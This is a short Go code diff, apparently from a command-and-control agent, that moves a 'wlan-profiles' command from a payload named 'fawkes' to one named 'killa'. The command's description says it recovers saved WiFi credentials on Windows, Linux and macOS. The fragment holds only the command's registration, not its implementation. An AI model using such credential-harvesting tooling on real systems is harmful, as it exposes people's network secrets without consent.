@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "wlan-profiles",
 		Description:         "Recover saved WiFi network profiles and credentials. Windows: WLAN API (plaintext keys). Linux: NetworkManager/wpa_supplicant/iwd configs. macOS: Keychain.",
 		HelpString:          "wlan-profiles\nwlan-profiles -name HomeNetwork",
